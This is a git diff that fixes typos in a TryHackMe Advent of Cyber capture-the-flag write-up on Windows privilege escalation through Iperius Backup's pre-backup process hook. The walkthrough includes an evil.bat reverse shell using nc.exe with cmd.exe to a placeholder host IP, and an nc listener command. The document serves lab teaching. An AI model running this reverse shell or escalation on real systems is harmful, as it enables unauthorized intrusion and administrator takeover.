@@ -25,7 +25,7 @@
 - [Questions 5-6](#Questions-5-6)
 
 ## Walkthrough
-In this box we are told that the disaster recovery plan, that was locked down to protect its security and confidentiality, has become inaccessible due to a decrease in privileges of McSkidy's account due to Grinch's shenanigans. Can we escalate the privileges back and save the disaster recovery plan?
+In this box, we are told that the disaster recovery plan, that was locked down to protect its security and confidentiality, has become inaccessible due to a decrease in privileges of McSkidy's account due to Grinch's shenanigans. Can we escalate the privileges back and save the disaster recovery plan?
 
 To start, either use the Attack Box or RDP into the system with the `xfreerdp` utility:
 
@@ -37,27 +37,27 @@ The information included in the TryHackMe walkthrough is summarized in the [Wind
 ### Privesc
 [Top](#TOC)
 
-We are told first that the *Iperius Backup Service* offers a  potential [Privilege Escalation (privsec)](../../../../Knowledge%20Base/Vulnerabilities/Privilege%20Escalation%20(privsec).md#Windows) vector due to its potential to run backup tasks with admin privileges despite the local users privilege level. Open the search bar in the bottom of the screen and search `Iperius` and launch the application. 
+We are told first that the *Iperius Backup Service* offers a  potential [Privilege Escalation (privsec)](../../../../Knowledge%20Base/Vulnerabilities/Privilege%20Escalation%20(privsec).md#Windows) vector due to its potential to run backup tasks with admin privileges despite the local users privilege level. Open the search bar at the bottom of the screen and search `Iperius` and launch the application. 
 
-Start a new backup tasks by clicking the left-most icon on the menu bar and configure as follows. 
+Start a new backup task by clicking the left-most icon on the menu bar and configure as follows. 
 
 ![Creating a Backup Task](AoC-2021_Photos/Day_13/01_AoC-Day-13_12-29-21-Iperius.png)
 
 #### Source
 
-In the `Items` tab on this screen select file icon with a `+` sign and set the path to `C:\Users\McSkidy\Desktop` and click `OK`. 
+In the `Items` tab on this screen select the file icon with a `+` sign and set the path to `C:\Users\McSkidy\Desktop` and click `OK`. 
 
 ![Backup Path](AoC-2021_Photos/Day_13/02_AoC_Day_13_12-29-21-Backup-Path.png)
 
 #### Destination
 
-On the `Destinations` tab, select the same folder icon and make the destination the `Docuemnts` folder. 
+On the `Destinations` tab, select the same folder icon and make the destination the `Documents` folder. 
 
 ![Destination Path](AoC-2021_Photos/Day_13/03_AoC_Day_13_12-29-21-Destination.png)
 
 #### Executable
 
-Here comes the exploit. In the `Other Processes` tab we can choose to run a program prior to the backup executes, and it will be ran as administrator. If this file is malicious, the attacker can successfully escalate privileges. 
+Here comes the exploit. In the `Other Processes` tab, we can choose to run a program before the backup executes, and it will be ran as administrator. If this file is malicious, the attacker can successfully escalate privileges. 
 
 We are instructed to utilize a `.bat`, which stands for `Batch`, a basic executable in windows similar to `.sh` in *UNIX* systems. This `.bat` file will use another file located in `C:\Users\McSkidy\Downloads\nc.exe`. Launch *notepad* and add the following code. 
 
@@ -73,11 +73,11 @@ C:\Users\McSkidy\Downloads\nc.exe <HOST_MACHINE_IP> 1337 -e cmd.exe
 
 Save the file as `evil.bat` on the `Desktop`. Notice the little gear icon in the filename? Windows is telling you this is executable. 
 
-What is happening? This file is calling the `Ncat` utility in our `Downloads` folder, a common tool used by attackers to create a reverse shell. Our code is telling `nc` to connect to our attacking machine IP on port `1337` and run a program wiith `-e`. The program we want ran is `cmd.exe`, the command prompt in Windows. 
+What is happening? This file is calling the `Ncat` utility in our `Downloads` folder, a common tool used by attackers to create a reverse shell. Our code is telling `nc` to connect to our attacking machine IP on port `1337` and run a program with `-e`. The program we want ran is `cmd.exe`, the command prompt in Windows. 
 
 #### Staging
 
-On your host, prepare a `nc` listener. The great hing about `nc` is that we can connect `nc` to `nc` using a different set of flags. Run this on your host (the attacking host):
+On your host, prepare a `nc` listener. The great thing about `nc` is that we can connect `nc` to `nc` using a different set of flags. Run this on your host (the attacking host):
 
 `nc -lvnp 1337`
 
@@ -89,7 +89,7 @@ Let's verify the payload works first. Double click `evil.bat` to run it and chec
 
 ![Shell Connected](AoC-2021_Photos/Day_13/07_AoC_Day_13_12-29-21-Payload-Confirmed.png)
 
-Great! That payload works, now we just need to run it as administrator using *Iperius*
+Great! That payload works, now we just need to run it as an administrator using *Iperius*
 
 #### Exploiting
 Now we are ready to stage the exploit. Choose `evil.bat` to run on the `Other processes` tab before the backup. 
